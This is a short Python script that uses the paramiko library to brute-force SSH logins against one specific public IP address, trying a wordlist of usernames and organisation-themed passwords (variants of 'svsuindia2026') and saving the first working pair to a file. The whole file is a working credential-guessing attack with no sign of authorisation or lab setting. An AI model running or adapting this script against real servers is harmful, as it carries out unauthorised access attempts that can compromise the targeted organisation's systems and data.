import paramiko
import itertools

def test_ssh(user, pwd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect('98.70.37.219', username=user, password=pwd, timeout=5)
        print(f"SUCCESS with {user} : {pwd}")
        ssh.close()
        return True
    except Exception as e:
        return False

users = ["svsuuserbot", "svsuuser", "svsu", "azureuser", "ubuntu"]
pwds = [
    "svsuindia2026", 
    "svusindia2026", 
    "SVSUIndia2026", 
    "SVSUindia2026", 
    "svsuindia@2026",
    "SVSU@2026"
]

print("Starting scan...")
for u, p in itertools.product(users, pwds):
    if test_ssh(u, p):
        print("MATCH FOUND!")
        import os
        with open("match.txt", "w") as f:
            f.write(f"{u}:{p}")
        exit(0)
print("Finished. No match.")
